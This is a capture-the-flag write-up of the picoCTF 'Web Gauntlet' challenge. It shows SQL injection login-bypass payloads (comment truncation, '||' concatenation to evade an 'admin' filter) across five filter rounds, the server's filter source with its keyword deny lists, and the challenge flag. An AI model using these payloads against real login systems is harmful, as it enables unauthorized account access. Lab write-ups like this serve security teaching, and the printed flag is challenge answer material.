# Web Gauntlet
Category: Web Exploitation

## Description

> Can you beat the filters? Log in as admin 

## Solution

Two links were attached. One contained a simple web form with input fields for a username and password:
```html
<h5 class="card-title text-center">Round 1 / 5</h5>
<form class="form-signin" action="index.php" method="post">
    <div class="form-label-group">
        <input type="text" id="user" name="user" class="form-control" placeholder="Username" required autofocus>
        <label for="user">Username</label>
    </div>

    <div class="form-label-group">
        <input type="password" id="pass" name="pass" class="form-control" placeholder="Password" required>
        <label for="pass">Password</label>
    </div>

    <button class="btn btn-lg btn-primary btn-block text-uppercase" type="submit">Sign in</button>
</form>
```

If we try to sign in with a random username and password (e.g. `user:pass`), we get the following as output:
```sql
SELECT * FROM users WHERE username='user' AND password='pass' 
```

The other was called `filter.php` and contained this:
```console
root@kali:/media/sf_CTFs/pico/Web_Gauntlet# curl http://jupiter.challenges.picoctf.org:28955/filter.php
Round1: or<br/>
```

So, it seems safe to assume that we need to login to the website using SQL injection without using the keyword in the filter.

To pass the first round, we can use `admin'--` as the username, causing the rest of the clause to be interpreted as a comment:

```sql
SELECT * FROM users WHERE username='admin'--' AND password='pass' 
```

Round 2 introduces the following filter:
```
Round2: or and like = --
```

We'll just try a different comment style. `#` doesn't work but `/*` does, making our input `admin'/*` and our complete clause:
```sql
SELECT * FROM users WHERE username='admin'/*' AND password='pass' 
```

Round 3 has the following filters:
```
Round3: or and = like > < --
```

Same trick works here, using `admin'/*`:
```sql
SELECT * FROM users WHERE username='admin'/*' AND password='pass' 
```

Round 4 filters:
```
Round4: or and = like > < -- admin
```

We can't use `admin` so we'll just have to recreate the string via concatenation. `CONCAT` doesn't seem to work, but `||` does and this must be sqlite.

We enter `a'||'dmin'/*` as input and get:
```sql
SELECT * FROM users WHERE username='a'||'dmin'/*' AND password='pass' 
```

Last round, filters are:
```
Round5: or and = like > < -- union admin
```

Same as before, we use `a'||'dmin'/*` and get:
```sql
SELECT * FROM users WHERE username='a'||'dmin'/*' AND password='pass' 
```

Finally we are informed to check `filter.php` for the flag, where a PHP script is dumped:

```php
 <?php
session_start();

if (!isset($_SESSION["round"])) {
    $_SESSION["round"] = 1;
}
$round = $_SESSION["round"];
$filter = array("");
$view = ($_SERVER["PHP_SELF"] == "/filter.php");

if ($round === 1) {
    $filter = array("or");
    if ($view) {
        echo "Round1: ".implode(" ", $filter)."<br/>";
    }
} else if ($round === 2) {
    $filter = array("or", "and", "like", "=", "--");
    if ($view) {
        echo "Round2: ".implode(" ", $filter)."<br/>";
    }
} else if ($round === 3) {
    $filter = array(" ", "or", "and", "=", "like", ">", "<", "--");
    // $filter = array("or", "and", "=", "like", "union", "select", "insert", "delete", "if", "else", "true", "false", "admin");
    if ($view) {
        echo "Round3: ".implode(" ", $filter)."<br/>";
    }
} else if ($round === 4) {
    $filter = array(" ", "or", "and", "=", "like", ">", "<", "--", "admin");
    // $filter = array(" ", "/**/", "--", "or", "and", "=", "like", "union", "select", "insert", "delete", "if", "else", "true", "false", "admin");
    if ($view) {
        echo "Round4: ".implode(" ", $filter)."<br/>";
    }
} else if ($round === 5) {
    $filter = array(" ", "or", "and", "=", "like", ">", "<", "--", "union", "admin");
    // $filter = array("0", "unhex", "char", "/*", "*/", "--", "or", "and", "=", "like", "union", "select", "insert", "delete", "if", "else", "true", "false", "admin");
    if ($view) {
        echo "Round5: ".implode(" ", $filter)."<br/>";
    }
} else if ($round >= 6) {
    if ($view) {
        highlight_file("filter.php");
    }
} else {
    $_SESSION["round"] = 1;
}

// picoCTF{y0u_m4d3_1t_a5f58d5564fce237fbcc978af033c11b}
?> 
```

The flag: `picoCTF{y0u_m4d3_1t_a5f58d5564fce237fbcc978af033c11b}`